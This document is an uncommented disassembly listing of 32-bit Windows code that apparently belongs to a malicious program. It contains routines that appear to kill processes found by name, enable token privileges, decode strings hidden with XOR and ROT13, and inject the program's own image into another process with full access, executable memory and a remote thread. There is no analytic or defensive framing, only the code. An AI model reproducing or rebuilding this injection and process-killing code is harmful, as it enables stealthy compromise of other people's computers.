13145943:	33 d2                	xor    %edx,%edx
13145945:	be 88 36 15 13       	mov    $0x13153688,%esi
1314594a:	50                   	push   %eax
1314594b:	8b c1                	mov    %ecx,%eax
1314594d:	f7 f3                	div    %ebx
1314594f:	50                   	push   %eax
13145950:	68 e8 06 15 13       	push   $0x131506e8
13145955:	56                   	push   %esi
13145956:	ff 15 98 39 15 13    	call   *0x13153998
1314595c:	83 c4 14             	add    $0x14,%esp
1314595f:	8b c6                	mov    %esi,%eax
13145961:	5f                   	pop    %edi
13145962:	5e                   	pop    %esi
13145963:	5d                   	pop    %ebp
13145964:	5b                   	pop    %ebx
13145965:	c3                   	ret    
13145966:	55                   	push   %ebp
13145967:	8b ec                	mov    %esp,%ebp
13145969:	81 ec 00 01 00 00    	sub    $0x100,%esp
1314596f:	ff 75 08             	pushl  0x8(%ebp)
13145972:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13145978:	ff 75 0c             	pushl  0xc(%ebp)
1314597b:	68 14 ed 14 13       	push   $0x1314ed14
13145980:	50                   	push   %eax
13145981:	ff 15 98 39 15 13    	call   *0x13153998
13145987:	ff 75 10             	pushl  0x10(%ebp)
1314598a:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13145990:	50                   	push   %eax
13145991:	e8 68 10 00 00       	call   0x131469fe
13145996:	83 c4 18             	add    $0x18,%esp
13145999:	c9                   	leave  
1314599a:	c3                   	ret    
1314599b:	56                   	push   %esi
1314599c:	57                   	push   %edi
1314599d:	8b 7c 24 0c          	mov    0xc(%esp),%edi
131459a1:	33 f6                	xor    %esi,%esi
131459a3:	57                   	push   %edi
131459a4:	e8 54 cd ff ff       	call   0x131426fd
131459a9:	59                   	pop    %ecx
131459aa:	8a 04 3e             	mov    (%esi,%edi,1),%al
131459ad:	3a 44 24 10          	cmp    0x10(%esp),%al
131459b1:	74 19                	je     0x131459cc
131459b3:	3c 61                	cmp    $0x61,%al
131459b5:	7c 09                	jl     0x131459c0
131459b7:	3c 7a                	cmp    $0x7a,%al
131459b9:	7f 05                	jg     0x131459c0
131459bb:	2c 20                	sub    $0x20,%al
131459bd:	88 04 3e             	mov    %al,(%esi,%edi,1)
131459c0:	57                   	push   %edi
131459c1:	46                   	inc    %esi
131459c2:	e8 36 cd ff ff       	call   0x131426fd
131459c7:	3b f0                	cmp    %eax,%esi
131459c9:	59                   	pop    %ecx
131459ca:	76 de                	jbe    0x131459aa
131459cc:	5f                   	pop    %edi
131459cd:	5e                   	pop    %esi
131459ce:	c3                   	ret    
131459cf:	e8 fc cc ff ff       	call   0x131426d0
131459d4:	8b 4c 24 08          	mov    0x8(%esp),%ecx
131459d8:	2b 4c 24 04          	sub    0x4(%esp),%ecx
131459dc:	0f b7 c0             	movzwl %ax,%eax
131459df:	0f af c1             	imul   %ecx,%eax
131459e2:	99                   	cltd   
131459e3:	b9 00 80 00 00       	mov    $0x8000,%ecx
131459e8:	f7 f9                	idiv   %ecx
131459ea:	99                   	cltd   
131459eb:	2b c2                	sub    %edx,%eax
131459ed:	d1 f8                	sar    %eax
131459ef:	03 44 24 04          	add    0x4(%esp),%eax
131459f3:	c3                   	ret    
131459f4:	56                   	push   %esi
131459f5:	8b 74 24 0c          	mov    0xc(%esp),%esi
131459f9:	33 c0                	xor    %eax,%eax
131459fb:	83 fe 01             	cmp    $0x1,%esi
131459fe:	7e 1d                	jle    0x13145a1d
13145a00:	8b ce                	mov    %esi,%ecx
13145a02:	57                   	push   %edi
13145a03:	d1 e9                	shr    %ecx
13145a05:	8b d1                	mov    %ecx,%edx
13145a07:	f7 da                	neg    %edx
13145a09:	8d 34 56             	lea    (%esi,%edx,2),%esi
13145a0c:	8b 54 24 0c          	mov    0xc(%esp),%edx
13145a10:	0f b7 3a             	movzwl (%edx),%edi
13145a13:	03 c7                	add    %edi,%eax
13145a15:	42                   	inc    %edx
13145a16:	42                   	inc    %edx
13145a17:	49                   	dec    %ecx
13145a18:	75 f6                	jne    0x13145a10
13145a1a:	5f                   	pop    %edi
13145a1b:	eb 04                	jmp    0x13145a21
13145a1d:	8b 54 24 08          	mov    0x8(%esp),%edx
13145a21:	85 f6                	test   %esi,%esi
13145a23:	5e                   	pop    %esi
13145a24:	74 05                	je     0x13145a2b
13145a26:	0f b6 0a             	movzbl (%edx),%ecx
13145a29:	03 c1                	add    %ecx,%eax
13145a2b:	8b c8                	mov    %eax,%ecx
13145a2d:	25 ff ff 00 00       	and    $0xffff,%eax
13145a32:	c1 e9 10             	shr    $0x10,%ecx
13145a35:	03 c8                	add    %eax,%ecx
13145a37:	8b c1                	mov    %ecx,%eax
13145a39:	c1 e8 10             	shr    $0x10,%eax
13145a3c:	03 c1                	add    %ecx,%eax
13145a3e:	f7 d0                	not    %eax
13145a40:	c3                   	ret    
13145a41:	55                   	push   %ebp
13145a42:	8b ec                	mov    %esp,%ebp
13145a44:	81 ec 28 01 00 00    	sub    $0x128,%esp
13145a4a:	53                   	push   %ebx
13145a4b:	56                   	push   %esi
13145a4c:	57                   	push   %edi
13145a4d:	6a 49                	push   $0x49
13145a4f:	59                   	pop    %ecx
13145a50:	33 c0                	xor    %eax,%eax
13145a52:	8d bd dc fe ff ff    	lea    -0x124(%ebp),%edi
13145a58:	c7 85 d8 fe ff ff 28 	movl   $0x128,-0x128(%ebp)
13145a5f:	01 00 00 
13145a62:	f3 ab                	rep stos %eax,%es:(%edi)
13145a64:	33 ff                	xor    %edi,%edi
13145a66:	57                   	push   %edi
13145a67:	6a 02                	push   $0x2
13145a69:	ff 15 9c 39 15 13    	call   *0x1315399c
13145a6f:	8b d8                	mov    %eax,%ebx
13145a71:	83 fb ff             	cmp    $0xffffffff,%ebx
13145a74:	74 6a                	je     0x13145ae0
13145a76:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
13145a7c:	50                   	push   %eax
13145a7d:	53                   	push   %ebx
13145a7e:	ff 15 78 36 15 13    	call   *0x13153678
13145a84:	85 c0                	test   %eax,%eax
13145a86:	74 58                	je     0x13145ae0
13145a88:	ff 75 08             	pushl  0x8(%ebp)
13145a8b:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
13145a91:	50                   	push   %eax
13145a92:	e8 95 cc ff ff       	call   0x1314272c
13145a97:	59                   	pop    %ecx
13145a98:	85 c0                	test   %eax,%eax
13145a9a:	59                   	pop    %ecx
13145a9b:	75 29                	jne    0x13145ac6
13145a9d:	ff b5 e0 fe ff ff    	pushl  -0x120(%ebp)
13145aa3:	57                   	push   %edi
13145aa4:	6a 01                	push   $0x1
13145aa6:	ff 15 88 37 15 13    	call   *0x13153788
13145aac:	8b f0                	mov    %eax,%esi
13145aae:	83 fe ff             	cmp    $0xffffffff,%esi
13145ab1:	74 2d                	je     0x13145ae0
13145ab3:	57                   	push   %edi
13145ab4:	56                   	push   %esi
13145ab5:	ff 15 f8 33 15 13    	call   *0x131533f8
13145abb:	85 c0                	test   %eax,%eax
13145abd:	56                   	push   %esi
13145abe:	74 1a                	je     0x13145ada
13145ac0:	ff 15 80 33 15 13    	call   *0x13153380
13145ac6:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
13145acc:	50                   	push   %eax
13145acd:	53                   	push   %ebx
13145ace:	ff 15 e0 36 15 13    	call   *0x131536e0
13145ad4:	85 c0                	test   %eax,%eax
13145ad6:	74 0c                	je     0x13145ae4
13145ad8:	eb ae                	jmp    0x13145a88
13145ada:	ff 15 80 33 15 13    	call   *0x13153380
13145ae0:	33 c0                	xor    %eax,%eax
13145ae2:	eb 03                	jmp    0x13145ae7
13145ae4:	6a 01                	push   $0x1
13145ae6:	58                   	pop    %eax
13145ae7:	5f                   	pop    %edi
13145ae8:	5e                   	pop    %esi
13145ae9:	5b                   	pop    %ebx
13145aea:	c9                   	leave  
13145aeb:	c3                   	ret    
13145aec:	56                   	push   %esi
13145aed:	57                   	push   %edi
13145aee:	ff 74 24 0c          	pushl  0xc(%esp)
13145af2:	33 ff                	xor    %edi,%edi
13145af4:	57                   	push   %edi
13145af5:	6a 01                	push   $0x1
13145af7:	ff 15 88 37 15 13    	call   *0x13153788
13145afd:	8b f0                	mov    %eax,%esi
13145aff:	83 fe ff             	cmp    $0xffffffff,%esi
13145b02:	75 04                	jne    0x13145b08
13145b04:	33 c0                	xor    %eax,%eax
13145b06:	eb 18                	jmp    0x13145b20
13145b08:	57                   	push   %edi
13145b09:	56                   	push   %esi
13145b0a:	ff 15 f8 33 15 13    	call   *0x131533f8
13145b10:	85 c0                	test   %eax,%eax
13145b12:	74 03                	je     0x13145b17
13145b14:	6a 01                	push   $0x1
13145b16:	5f                   	pop    %edi
13145b17:	56                   	push   %esi
13145b18:	ff 15 80 33 15 13    	call   *0x13153380
13145b1e:	8b c7                	mov    %edi,%eax
13145b20:	5f                   	pop    %edi
13145b21:	5e                   	pop    %esi
13145b22:	c3                   	ret    
13145b23:	55                   	push   %ebp
13145b24:	8b ec                	mov    %esp,%ebp
13145b26:	83 ec 14             	sub    $0x14,%esp
13145b29:	56                   	push   %esi
13145b2a:	57                   	push   %edi
13145b2b:	68 00 01 00 00       	push   $0x100
13145b30:	be 68 35 15 13       	mov    $0x13153568,%esi
13145b35:	6a 00                	push   $0x0
13145b37:	56                   	push   %esi
13145b38:	e8 e5 ca ff ff       	call   0x13142622
13145b3d:	83 c4 0c             	add    $0xc,%esp
13145b40:	6a 41                	push   $0x41
13145b42:	5f                   	pop    %edi
13145b43:	57                   	push   %edi
13145b44:	8d 45 fc             	lea    -0x4(%ebp),%eax
13145b47:	68 6c ee 14 13       	push   $0x1314ee6c
13145b4c:	50                   	push   %eax
13145b4d:	ff 15 98 39 15 13    	call   *0x13153998
13145b53:	83 c4 0c             	add    $0xc,%esp
13145b56:	8d 45 fc             	lea    -0x4(%ebp),%eax
13145b59:	50                   	push   %eax
13145b5a:	ff 15 b8 36 15 13    	call   *0x131536b8
13145b60:	83 f8 03             	cmp    $0x3,%eax
13145b63:	75 63                	jne    0x13145bc8
13145b65:	8d 45 ec             	lea    -0x14(%ebp),%eax
13145b68:	50                   	push   %eax
13145b69:	8d 45 f0             	lea    -0x10(%ebp),%eax
13145b6c:	50                   	push   %eax
13145b6d:	8d 45 f4             	lea    -0xc(%ebp),%eax
13145b70:	50                   	push   %eax
13145b71:	8d 45 f8             	lea    -0x8(%ebp),%eax
13145b74:	50                   	push   %eax
13145b75:	8d 45 fc             	lea    -0x4(%ebp),%eax
13145b78:	50                   	push   %eax
13145b79:	ff 15 34 35 15 13    	call   *0x13153534
13145b7f:	8b 45 f8             	mov    -0x8(%ebp),%eax
13145b82:	0f af 45 f4          	imul   -0xc(%ebp),%eax
13145b86:	8b c8                	mov    %eax,%ecx
13145b88:	0f af 45 ec          	imul   -0x14(%ebp),%eax
13145b8c:	0f af 4d f0          	imul   -0x10(%ebp),%ecx
13145b90:	c1 e9 14             	shr    $0x14,%ecx
13145b93:	c1 e8 14             	shr    $0x14,%eax
13145b96:	51                   	push   %ecx
13145b97:	50                   	push   %eax
13145b98:	ff 75 08             	pushl  0x8(%ebp)
13145b9b:	e8 5e 30 00 00       	call   0x13148bfe
13145ba0:	59                   	pop    %ecx
13145ba1:	50                   	push   %eax
13145ba2:	8d 45 fc             	lea    -0x4(%ebp),%eax
13145ba5:	50                   	push   %eax
13145ba6:	ff 75 08             	pushl  0x8(%ebp)
13145ba9:	e8 35 30 00 00       	call   0x13148be3
13145bae:	59                   	pop    %ecx
13145baf:	50                   	push   %eax
13145bb0:	68 f4 06 15 13       	push   $0x131506f4
13145bb5:	56                   	push   %esi
13145bb6:	e8 42 cb ff ff       	call   0x131426fd
13145bbb:	59                   	pop    %ecx
13145bbc:	03 c6                	add    %esi,%eax
13145bbe:	50                   	push   %eax
13145bbf:	ff 15 98 39 15 13    	call   *0x13153998
13145bc5:	83 c4 1c             	add    $0x1c,%esp
13145bc8:	47                   	inc    %edi
13145bc9:	83 ff 5a             	cmp    $0x5a,%edi
13145bcc:	0f 8e 71 ff ff ff    	jle    0x13145b43
13145bd2:	56                   	push   %esi
13145bd3:	e8 25 cb ff ff       	call   0x131426fd
13145bd8:	59                   	pop    %ecx
13145bd9:	5f                   	pop    %edi
13145bda:	8b ce                	mov    %esi,%ecx
13145bdc:	49                   	dec    %ecx
13145bdd:	49                   	dec    %ecx
13145bde:	80 24 08 00          	andb   $0x0,(%eax,%ecx,1)
13145be2:	8b c6                	mov    %esi,%eax
13145be4:	5e                   	pop    %esi
13145be5:	c9                   	leave  
13145be6:	c3                   	ret    
13145be7:	56                   	push   %esi
13145be8:	57                   	push   %edi
13145be9:	8b 7c 24 0c          	mov    0xc(%esp),%edi
13145bed:	57                   	push   %edi
13145bee:	e8 0a cb ff ff       	call   0x131426fd
13145bf3:	59                   	pop    %ecx
13145bf4:	8b f0                	mov    %eax,%esi
13145bf6:	85 f6                	test   %esi,%esi
13145bf8:	7e 09                	jle    0x13145c03
13145bfa:	80 3c 3e 5c          	cmpb   $0x5c,(%esi,%edi,1)
13145bfe:	74 03                	je     0x13145c03
13145c00:	4e                   	dec    %esi
13145c01:	eb f3                	jmp    0x13145bf6
13145c03:	57                   	push   %edi
13145c04:	e8 f4 ca ff ff       	call   0x131426fd
13145c09:	40                   	inc    %eax
13145c0a:	50                   	push   %eax
13145c0b:	6a 00                	push   $0x0
13145c0d:	ff 74 24 1c          	pushl  0x1c(%esp)
13145c11:	e8 0c ca ff ff       	call   0x13142622
13145c16:	57                   	push   %edi
13145c17:	e8 e1 ca ff ff       	call   0x131426fd
13145c1c:	2b c6                	sub    %esi,%eax
13145c1e:	50                   	push   %eax
13145c1f:	8d 44 3e 01          	lea    0x1(%esi,%edi,1),%eax
13145c23:	50                   	push   %eax
13145c24:	ff 74 24 2c          	pushl  0x2c(%esp)
13145c28:	e8 23 cb ff ff       	call   0x13142750
13145c2d:	83 c4 20             	add    $0x20,%esp
13145c30:	5f                   	pop    %edi
13145c31:	5e                   	pop    %esi
13145c32:	c3                   	ret    
13145c33:	55                   	push   %ebp
13145c34:	8b ec                	mov    %esp,%ebp
13145c36:	51                   	push   %ecx
13145c37:	6a 00                	push   $0x0
13145c39:	8d 45 ff             	lea    -0x1(%ebp),%eax
13145c3c:	6a 01                	push   $0x1
13145c3e:	50                   	push   %eax
13145c3f:	ff 75 08             	pushl  0x8(%ebp)
13145c42:	ff 15 4c 37 15 13    	call   *0x1315374c
13145c48:	80 7d ff 0a          	cmpb   $0xa,-0x1(%ebp)
13145c4c:	74 05                	je     0x13145c53
13145c4e:	83 f8 ff             	cmp    $0xffffffff,%eax
13145c51:	75 e4                	jne    0x13145c37
13145c53:	c9                   	leave  
13145c54:	c3                   	ret    
13145c55:	55                   	push   %ebp
13145c56:	8b ec                	mov    %esp,%ebp
13145c58:	51                   	push   %ecx
13145c59:	6a 00                	push   $0x0
13145c5b:	8d 45 ff             	lea    -0x1(%ebp),%eax
13145c5e:	6a 01                	push   $0x1
13145c60:	50                   	push   %eax
13145c61:	ff 75 08             	pushl  0x8(%ebp)
13145c64:	ff 15 4c 37 15 13    	call   *0x1315374c
13145c6a:	83 f8 ff             	cmp    $0xffffffff,%eax
13145c6d:	74 0c                	je     0x13145c7b
13145c6f:	85 c0                	test   %eax,%eax
13145c71:	74 08                	je     0x13145c7b
13145c73:	8a 45 ff             	mov    -0x1(%ebp),%al
13145c76:	3a 45 0c             	cmp    0xc(%ebp),%al
13145c79:	75 de                	jne    0x13145c59
13145c7b:	c9                   	leave  
13145c7c:	c3                   	ret    
13145c7d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
13145c81:	56                   	push   %esi
13145c82:	6a 01                	push   $0x1
13145c84:	58                   	pop    %eax
13145c85:	80 7c 08 01 00       	cmpb   $0x0,0x1(%eax,%ecx,1)
13145c8a:	74 12                	je     0x13145c9e
13145c8c:	8a 14 08             	mov    (%eax,%ecx,1),%dl
13145c8f:	8b 74 24 0c          	mov    0xc(%esp),%esi
13145c93:	32 54 24 10          	xor    0x10(%esp),%dl
13145c97:	40                   	inc    %eax
13145c98:	88 54 30 fe          	mov    %dl,-0x2(%eax,%esi,1)
13145c9c:	eb e7                	jmp    0x13145c85
13145c9e:	5e                   	pop    %esi
13145c9f:	c3                   	ret    
13145ca0:	53                   	push   %ebx
13145ca1:	8b 5c 24 08          	mov    0x8(%esp),%ebx
13145ca5:	56                   	push   %esi
13145ca6:	57                   	push   %edi
13145ca7:	8b 7c 24 14          	mov    0x14(%esp),%edi
13145cab:	53                   	push   %ebx
13145cac:	33 f6                	xor    %esi,%esi
13145cae:	80 27 00             	andb   $0x0,(%edi)
13145cb1:	e8 47 ca ff ff       	call   0x131426fd
13145cb6:	85 c0                	test   %eax,%eax
13145cb8:	59                   	pop    %ecx
13145cb9:	7c 16                	jl     0x13145cd1
13145cbb:	8a 04 1e             	mov    (%esi,%ebx,1),%al
13145cbe:	53                   	push   %ebx
13145cbf:	32 44 24 1c          	xor    0x1c(%esp),%al
13145cc3:	46                   	inc    %esi
13145cc4:	88 04 37             	mov    %al,(%edi,%esi,1)
13145cc7:	e8 31 ca ff ff       	call   0x131426fd
13145ccc:	3b f0                	cmp    %eax,%esi
13145cce:	59                   	pop    %ecx
13145ccf:	7e ea                	jle    0x13145cbb
13145cd1:	03 f7                	add    %edi,%esi
13145cd3:	e8 f8 c9 ff ff       	call   0x131426d0
13145cd8:	88 46 01             	mov    %al,0x1(%esi)
13145cdb:	80 66 02 00          	andb   $0x0,0x2(%esi)
13145cdf:	5f                   	pop    %edi
13145ce0:	5e                   	pop    %esi
13145ce1:	5b                   	pop    %ebx
13145ce2:	c3                   	ret    
13145ce3:	55                   	push   %ebp
13145ce4:	8b ec                	mov    %esp,%ebp
13145ce6:	83 ec 1c             	sub    $0x1c,%esp
13145ce9:	8d 45 fc             	lea    -0x4(%ebp),%eax
13145cec:	50                   	push   %eax
13145ced:	6a 28                	push   $0x28
13145cef:	ff 15 d8 33 15 13    	call   *0x131533d8
13145cf5:	50                   	push   %eax
13145cf6:	ff 15 18 34 15 13    	call   *0x13153418
13145cfc:	85 c0                	test   %eax,%eax
13145cfe:	74 48                	je     0x13145d48
13145d00:	8d 45 f4             	lea    -0xc(%ebp),%eax
13145d03:	50                   	push   %eax
13145d04:	68 18 07 15 13       	push   $0x13150718
13145d09:	6a 00                	push   $0x0
13145d0b:	ff 15 ec 33 15 13    	call   *0x131533ec
13145d11:	85 c0                	test   %eax,%eax
13145d13:	74 33                	je     0x13145d48
13145d15:	8b 45 f4             	mov    -0xc(%ebp),%eax
13145d18:	6a 00                	push   $0x0
13145d1a:	89 45 e8             	mov    %eax,-0x18(%ebp)
13145d1d:	8b 45 f8             	mov    -0x8(%ebp),%eax
13145d20:	89 45 ec             	mov    %eax,-0x14(%ebp)
13145d23:	6a 00                	push   $0x0
13145d25:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13145d28:	6a 10                	push   $0x10
13145d2a:	50                   	push   %eax
13145d2b:	6a 00                	push   $0x0
13145d2d:	ff 75 fc             	pushl  -0x4(%ebp)
13145d30:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
13145d37:	c7 45 f0 02 00 00 00 	movl   $0x2,-0x10(%ebp)
13145d3e:	ff 15 c4 33 15 13    	call   *0x131533c4
13145d44:	85 c0                	test   %eax,%eax
13145d46:	75 08                	jne    0x13145d50
13145d48:	ff 15 70 36 15 13    	call   *0x13153670
13145d4e:	c9                   	leave  
13145d4f:	c3                   	ret    
13145d50:	ff 75 fc             	pushl  -0x4(%ebp)
13145d53:	ff 15 80 33 15 13    	call   *0x13153380
13145d59:	6a 01                	push   $0x1
13145d5b:	58                   	pop    %eax
13145d5c:	c9                   	leave  
13145d5d:	c3                   	ret    
13145d5e:	55                   	push   %ebp
13145d5f:	8b ec                	mov    %esp,%ebp
13145d61:	83 ec 38             	sub    $0x38,%esp
13145d64:	56                   	push   %esi
13145d65:	57                   	push   %edi
13145d66:	6a 06                	push   $0x6
13145d68:	be 48 07 15 13       	mov    $0x13150748,%esi
13145d6d:	59                   	pop    %ecx
13145d6e:	8d 7d e4             	lea    -0x1c(%ebp),%edi
13145d71:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13145d73:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
13145d75:	a4                   	movsb  %ds:(%esi),%es:(%edi)
13145d76:	6a 06                	push   $0x6
13145d78:	be 2c 07 15 13       	mov    $0x1315072c,%esi
13145d7d:	59                   	pop    %ecx
13145d7e:	8d 7d c8             	lea    -0x38(%ebp),%edi
13145d81:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13145d83:	ff 75 08             	pushl  0x8(%ebp)
13145d86:	8d 45 e4             	lea    -0x1c(%ebp),%eax
13145d89:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
13145d8b:	50                   	push   %eax
13145d8c:	a4                   	movsb  %ds:(%esi),%es:(%edi)
13145d8d:	e8 dd c8 ff ff       	call   0x1314266f
13145d92:	59                   	pop    %ecx
13145d93:	59                   	pop    %ecx
13145d94:	5f                   	pop    %edi
13145d95:	85 c0                	test   %eax,%eax
13145d97:	5e                   	pop    %esi
13145d98:	74 14                	je     0x13145dae
13145d9a:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
13145d9d:	6a 1a                	push   $0x1a
13145d9f:	2b c1                	sub    %ecx,%eax
13145da1:	59                   	pop    %ecx
13145da2:	83 c0 0d             	add    $0xd,%eax
13145da5:	99                   	cltd   
13145da6:	f7 f9                	idiv   %ecx
13145da8:	8a 44 15 e4          	mov    -0x1c(%ebp,%edx,1),%al
13145dac:	c9                   	leave  
13145dad:	c3                   	ret    
13145dae:	ff 75 08             	pushl  0x8(%ebp)
13145db1:	8d 45 c8             	lea    -0x38(%ebp),%eax
13145db4:	50                   	push   %eax
13145db5:	e8 b5 c8 ff ff       	call   0x1314266f
13145dba:	59                   	pop    %ecx
13145dbb:	85 c0                	test   %eax,%eax
13145dbd:	59                   	pop    %ecx
13145dbe:	74 14                	je     0x13145dd4
13145dc0:	8d 4d c8             	lea    -0x38(%ebp),%ecx
13145dc3:	6a 1a                	push   $0x1a
13145dc5:	2b c1                	sub    %ecx,%eax
13145dc7:	59                   	pop    %ecx
13145dc8:	83 c0 0d             	add    $0xd,%eax
13145dcb:	99                   	cltd   
13145dcc:	f7 f9                	idiv   %ecx
13145dce:	8a 44 15 c8          	mov    -0x38(%ebp,%edx,1),%al
13145dd2:	c9                   	leave  
13145dd3:	c3                   	ret    
13145dd4:	8a 45 08             	mov    0x8(%ebp),%al
13145dd7:	c9                   	leave  
13145dd8:	c3                   	ret    
13145dd9:	56                   	push   %esi
13145dda:	8b 74 24 0c          	mov    0xc(%esp),%esi
13145dde:	57                   	push   %edi
13145ddf:	8b 7c 24 0c          	mov    0xc(%esp),%edi
13145de3:	8a 06                	mov    (%esi),%al
13145de5:	84 c0                	test   %al,%al
13145de7:	74 11                	je     0x13145dfa
13145de9:	50                   	push   %eax
13145dea:	46                   	inc    %esi
13145deb:	e8 6e ff ff ff       	call   0x13145d5e
13145df0:	88 07                	mov    %al,(%edi)
13145df2:	8a 06                	mov    (%esi),%al
13145df4:	47                   	inc    %edi
13145df5:	59                   	pop    %ecx
13145df6:	84 c0                	test   %al,%al
13145df8:	75 ef                	jne    0x13145de9
13145dfa:	80 27 00             	andb   $0x0,(%edi)
13145dfd:	5f                   	pop    %edi
13145dfe:	5e                   	pop    %esi
13145dff:	c3                   	ret    
13145e00:	55                   	push   %ebp
13145e01:	8b ec                	mov    %esp,%ebp
13145e03:	83 ec 10             	sub    $0x10,%esp
13145e06:	a1 30 d1 14 13       	mov    0x1314d130,%eax
13145e0b:	53                   	push   %ebx
13145e0c:	33 db                	xor    %ebx,%ebx
13145e0e:	56                   	push   %esi
13145e0f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
13145e12:	8b 48 3c             	mov    0x3c(%eax),%ecx
13145e15:	57                   	push   %edi
13145e16:	be 00 30 00 00       	mov    $0x3000,%esi
13145e1b:	8b 7c 01 50          	mov    0x50(%ecx,%eax,1),%edi
13145e1f:	6a 04                	push   $0x4
13145e21:	56                   	push   %esi
13145e22:	57                   	push   %edi
13145e23:	53                   	push   %ebx
13145e24:	ff 15 e8 33 15 13    	call   *0x131533e8
13145e2a:	3b c3                	cmp    %ebx,%eax
13145e2c:	89 45 f8             	mov    %eax,-0x8(%ebp)
13145e2f:	75 07                	jne    0x13145e38
13145e31:	33 c0                	xor    %eax,%eax
13145e33:	e9 83 00 00 00       	jmp    0x13145ebb
13145e38:	8d 4d fc             	lea    -0x4(%ebp),%ecx
13145e3b:	51                   	push   %ecx
13145e3c:	57                   	push   %edi
13145e3d:	50                   	push   %eax
13145e3e:	ff 35 30 d1 14 13    	pushl  0x1314d130
13145e44:	ff 15 d8 33 15 13    	call   *0x131533d8
13145e4a:	50                   	push   %eax
13145e4b:	ff 15 18 37 15 13    	call   *0x13153718
13145e51:	85 c0                	test   %eax,%eax
13145e53:	74 dc                	je     0x13145e31
13145e55:	68 00 80 00 00       	push   $0x8000
13145e5a:	53                   	push   %ebx
13145e5b:	ff 35 30 d1 14 13    	pushl  0x1314d130
13145e61:	8b 5d 08             	mov    0x8(%ebp),%ebx
13145e64:	53                   	push   %ebx
13145e65:	ff 15 4c 35 15 13    	call   *0x1315354c
13145e6b:	6a 40                	push   $0x40
13145e6d:	56                   	push   %esi
13145e6e:	ff 75 fc             	pushl  -0x4(%ebp)
13145e71:	ff 35 30 d1 14 13    	pushl  0x1314d130
13145e77:	53                   	push   %ebx
13145e78:	ff 15 84 33 15 13    	call   *0x13153384
13145e7e:	85 c0                	test   %eax,%eax
13145e80:	a3 c4 39 15 13       	mov    %eax,0x131539c4
13145e85:	74 aa                	je     0x13145e31
13145e87:	8d 4d f4             	lea    -0xc(%ebp),%ecx
13145e8a:	51                   	push   %ecx
13145e8b:	6a 40                	push   $0x40
13145e8d:	ff 75 fc             	pushl  -0x4(%ebp)
13145e90:	50                   	push   %eax
13145e91:	53                   	push   %ebx
13145e92:	ff 15 28 37 15 13    	call   *0x13153728
13145e98:	8d 45 f0             	lea    -0x10(%ebp),%eax
13145e9b:	89 3d c8 39 15 13    	mov    %edi,0x131539c8
13145ea1:	50                   	push   %eax
13145ea2:	ff 75 fc             	pushl  -0x4(%ebp)
13145ea5:	ff 75 f8             	pushl  -0x8(%ebp)
13145ea8:	ff 35 c4 39 15 13    	pushl  0x131539c4
13145eae:	53                   	push   %ebx
13145eaf:	ff 15 0c 34 15 13    	call   *0x1315340c
13145eb5:	f7 d8                	neg    %eax
13145eb7:	1b c0                	sbb    %eax,%eax
13145eb9:	f7 d8                	neg    %eax
13145ebb:	5f                   	pop    %edi
13145ebc:	5e                   	pop    %esi
13145ebd:	5b                   	pop    %ebx
13145ebe:	c9                   	leave  
13145ebf:	c3                   	ret    
13145ec0:	55                   	push   %ebp
13145ec1:	8b ec                	mov    %esp,%ebp
13145ec3:	56                   	push   %esi
13145ec4:	33 f6                	xor    %esi,%esi
13145ec6:	ff 75 0c             	pushl  0xc(%ebp)
13145ec9:	56                   	push   %esi
13145eca:	68 ff 0f 1f 00       	push   $0x1f0fff
13145ecf:	ff 15 88 37 15 13    	call   *0x13153788
13145ed5:	3b c6                	cmp    %esi,%eax
13145ed7:	a3 c0 39 15 13       	mov    %eax,0x131539c0
13145edc:	74 2b                	je     0x13145f09
13145ede:	50                   	push   %eax
13145edf:	e8 1c ff ff ff       	call   0x13145e00
13145ee4:	85 c0                	test   %eax,%eax
13145ee6:	59                   	pop    %ecx
13145ee7:	74 20                	je     0x13145f09
13145ee9:	8d 45 0c             	lea    0xc(%ebp),%eax
13145eec:	50                   	push   %eax
13145eed:	56                   	push   %esi
13145eee:	56                   	push   %esi
13145eef:	ff 75 08             	pushl  0x8(%ebp)
13145ef2:	56                   	push   %esi
13145ef3:	56                   	push   %esi
13145ef4:	ff 35 c0 39 15 13    	pushl  0x131539c0
13145efa:	ff 15 f4 36 15 13    	call   *0x131536f4
13145f00:	85 c0                	test   %eax,%eax
13145f02:	74 05                	je     0x13145f09
13145f04:	6a 01                	push   $0x1
13145f06:	58                   	pop    %eax
13145f07:	eb 02                	jmp    0x13145f0b
13145f09:	33 c0                	xor    %eax,%eax
13145f0b:	5e                   	pop    %esi
13145f0c:	5d                   	pop    %ebp
13145f0d:	c3                   	ret    
13145f0e:	55                   	push   %ebp
13145f0f:	8b ec                	mov    %esp,%ebp
13145f11:	81 ec 00 01 00 00    	sub    $0x100,%esp
13145f17:	68 00 01 00 00       	push   $0x100
13145f1c:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13145f22:	6a 00                	push   $0x0
13145f24:	50                   	push   %eax
13145f25:	e8 f8 c6 ff ff       	call   0x13142622
13145f2a:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13145f30:	6a 2b                	push   $0x2b
13145f32:	50                   	push   %eax
13145f33:	ff 75 0c             	pushl  0xc(%ebp)
13145f36:	e8 42 fd ff ff       	call   0x13145c7d
13145f3b:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
13145f41:	50                   	push   %eax
13145f42:	e8 e4 f6 ff ff       	call   0x1314562b
13145f47:	50                   	push   %eax
13145f48:	ff 75 08             	pushl  0x8(%ebp)
13145f4b:	e8 70 ff ff ff       	call   0x13145ec0
13145f50:	83 c4 24             	add    $0x24,%esp
13145f53:	c9                   	leave  
13145f54:	c3                   	ret    
13145f55:	8b 44 24 04          	mov    0x4(%esp),%eax
13145f59:	83 60 14 00          	andl   $0x0,0x14(%eax)
13145f5d:	83 60 10 00          	andl   $0x0,0x10(%eax)
